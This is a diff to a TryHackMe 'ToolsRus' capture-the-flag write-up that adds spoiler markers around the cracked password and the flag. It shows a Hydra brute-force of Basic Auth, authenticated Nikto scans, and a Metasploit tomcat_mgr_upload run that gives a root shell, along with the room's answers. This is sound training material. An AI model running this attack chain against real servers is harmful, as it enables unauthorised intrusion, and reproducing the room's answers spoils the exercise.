@@ -2,9 +2,9 @@
 title: ToolsRus
 summary: TryHackMe room using Feroxbuster, Hydra, Nmap, Nikto, and Metasploit to enumerate and exploit an exposed Apache Tomcat Manager instance.
 date: 2026-06-29
+tags: [TryHackMe, Enumeration, Feroxbuster, Hydra, Nmap, Nikto, Metasploit, Tomcat]
 difficulty: easy
 os: Linux
-tags: [TryHackMe, Enumeration, Feroxbuster, Hydra, Nmap, Nikto, Metasploit, Tomcat]
 url: https://tryhackme.com/room/toolsrus
 ---
 
@@ -83,14 +83,14 @@ hydra -l bob -P /usr/share/wordlists/rockyou.txt toolsrus.thm http-get /protecte
 ### Output
 ```bash
 [DATA] attacking http-get://toolsrus.thm:80/protected
-[80][http-get] host: toolsrus.thm   login: bob   password: bubbles
+[80][http-get] host: toolsrus.thm   login: bob   password: ||bubbles||
 [STATUS] attack finished for toolsrus.thm (valid pair found)
 1 of 1 target successfully completed, 1 valid password found
 ```
 
 ### Answer
 ```bash
-bubbles
+||bubbles||
 ```
 
 ## 5. Service Enumeration
@@ -141,7 +141,7 @@ Apache Tomcat/7.0.88
 #### Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files are found?
 ### Nikto
 ```bash
-nikto -h http://toolsrus.thm:1234/manager/html -id bob:bubbles
+nikto -h http://toolsrus.thm:1234/manager/html -id bob:||bubbles||
 ```
 
 ### Output
@@ -168,7 +168,7 @@ I also scanned the main web service on port `80`.
 
 ### Nikto
 ```bash
-nikto -h http://toolsrus.thm:80 -id bob:bubbles
+nikto -h http://toolsrus.thm:80 -id bob:||bubbles||
 ```
 
 ### Output
@@ -197,7 +197,7 @@ The Tomcat manager scan identified the Apache-Coyote version.
 ## 7. Exploitation
 
 #### Use Metasploit to exploit the service and get a shell on the system.
-The credentials `bob:bubbles` worked against Tomcat Manager, so I used the Tomcat Manager upload module in Metasploit.
+The credentials `bob:||bubbles||` worked against Tomcat Manager, so I used the Tomcat Manager upload module in Metasploit.
 
 ### Metasploit
 ```bash
@@ -207,7 +207,7 @@ use exploit/multi/http/tomcat_mgr_upload
 set RHOSTS 10.130.146.145
 set RPORT 1234
 set HttpUsername bob
-set HttpPassword bubbles
+set HttpPassword ||bubbles||
 run
 ```
 
@@ -246,10 +246,10 @@ cat /root/flag.txt
 
 ### Answer
 ```bash
-ff1fc4a81affcc7688cf89ae7dc6e0e1
+||ff1fc4a81affcc7688cf89ae7dc6e0e1||
 ```
 
 ## 8. Summary
-This room tied together the basic enumeration and exploitation workflow well. Feroxbuster found useful web directories, `/guidelines/` leaked the username `bob`, and Hydra cracked the Basic Auth password as `bubbles`.
+This room tied together the basic enumeration and exploitation workflow well. Feroxbuster found useful web directories, `/guidelines/` leaked the username `bob`, and Hydra cracked the Basic Auth password as `||bubbles||`.
 
 Nmap then showed an additional web service on port `1234`, which turned out to be Apache Tomcat `7.0.88`. Nikto confirmed authenticated access to Tomcat Manager and identified Tomcat documentation paths. With valid Tomcat Manager credentials, Metasploit's `tomcat_mgr_upload` module provided a shell as `root`, allowing the final flag to be read from `/root/flag.txt`.
